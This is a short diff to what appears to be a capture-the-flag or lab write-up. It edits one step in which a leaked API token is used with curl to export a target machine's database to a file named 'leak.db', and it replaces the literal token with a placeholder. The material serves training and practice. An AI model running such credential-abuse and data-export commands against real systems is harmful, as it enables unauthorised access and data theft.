@@ -99,7 +99,7 @@ This worked and revealed:
 Used the API key to export the database:
 
 ```bash
-curl -H "X-Valentine-Token: CUPID_MASTER_KEY_2024_XOXO" http://MACHINE_IP:5000/api/admin/export_db -o leak.db
+curl -H "X-Valentine-Token: API_KEY" http://MACHINE_IP:5000/api/admin/export_db -o leak.db
 ```
 
 ---
